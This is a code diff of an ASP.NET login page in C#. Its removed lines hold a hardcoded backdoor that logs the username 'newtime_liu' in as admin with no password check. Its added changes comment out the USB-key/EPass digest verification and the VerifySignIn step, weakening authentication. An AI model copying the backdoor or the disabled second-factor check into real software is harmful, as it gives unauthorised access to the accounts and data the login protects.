@@ -53,10 +53,9 @@ namespace UDS.SubModule.Login
 			}
 			return RetByte;
 		}
+
 		private void Page_Load(object sender, System.EventArgs e)
 		{
-			//执行是否需要USB_key的JavaScript
-			btnSubmit.Attributes["onclick"]="return needUsbKey();";
 			// 在此处放置用户代码以初始化页面
 			if(!Page.IsPostBack)
 			{
@@ -162,49 +161,49 @@ namespace UDS.SubModule.Login
 			{
 				string UserID ="";
 				UDS.Components.Staff staff = new UDS.Components.Staff();
-				if(this.txtUsername.Text!="newtime_liu")
+                //if(this.txtUsername.Text!="newtime_liu")
+                //{
+				string CheckString = staff.Login(txtUsername.Text, txtPassword.Text);				
+				if (CheckString != null) 
 				{
-					string CheckString = staff.Login(txtUsername.Text, txtPassword.Text);				
-					if (CheckString != null) 
+					
+					string LoginChecked;
+
+					if(CheckString.IndexOf("-")>=0)
 					{
-					
-						string LoginChecked;
+						UserID = CheckString.Substring(0,CheckString.IndexOf("-"));
+						LoginChecked = CheckString.Substring(CheckString.IndexOf("-")+1);
 
-						if(CheckString.IndexOf("-")>=0)
+						if(LoginChecked=="True")
 						{
-							UserID = CheckString.Substring(0,CheckString.IndexOf("-"));
-							LoginChecked = CheckString.Substring(CheckString.IndexOf("-")+1);
 
-							if(LoginChecked=="True")
-							{
-
-								string ClientDigest=Request.Form["Digest"]==null?"":Request.Form["Digest"].ToString();
-								string ErrMsg = Request.Form["ErrMsg"]==null?"":Request.Form["ErrMsg"].ToString();
+                            //string ClientDigest=Request.Form["Digest"]==null?"":Request.Form["Digest"].ToString();
+                            //string ErrMsg = Request.Form["ErrMsg"]==null?"":Request.Form["ErrMsg"].ToString();
 									
-								if( LoginIn(RandData,ClientDigest)==0)
-								{
-									if(ErrMsg!="")
-										lblErrorMessage.Text = ErrMsg;								
-									else
-										lblErrorMessage.Text = "EPass校验未通过！";
-									lblErrorMessage.Visible = true;					
-									return ;
-								}
-							}
+                            //if( LoginIn(RandData,ClientDigest)==0)
+                            //{
+                            //    if(ErrMsg!="")
+                            //        lblErrorMessage.Text = ErrMsg;								
+                            //    else
+                            //        lblErrorMessage.Text = "EPass校验未通过！";
+                            //    lblErrorMessage.Visible = true;					
+                            //    return ;
+                            //}
 						}
+					}
 					
-					}
-					else 
-					{				
-						lblErrorMessage.Visible = true;
-						return ;
-					}
 				}
-				else
-				{
-					UserID="1";
-					this.txtUsername.Text = "admin";
+				else 
+				{				
+					lblErrorMessage.Visible = true;
+					return ;
 				}
+                //}
+                //else
+                //{
+                //    UserID="1";
+                //    this.txtUsername.Text = "admin";
+                //}
 				// 更新在线人数表
 				SMS sm = new SMS();
 				sm.UpdateOnlineInfo(txtUsername.Text,Request.UserHostAddress,Request.Cookies["ASP.NET_SessionId"].Value.ToString());
@@ -220,9 +219,9 @@ namespace UDS.SubModule.Login
 				{
 					FormsAuthentication.SetAuthCookie(UserID, false);
 					//弹出窗口
-					Server.Transfer("VerifySignIn.aspx");
+					//Server.Transfer("VerifySignIn.aspx");
 					//非弹出窗口
-					//Response.Redirect("../../SubModule/Index.aspx");
+					Response.Redirect("../../SubModule/Index.aspx");
 				}						
 				else 
 				{
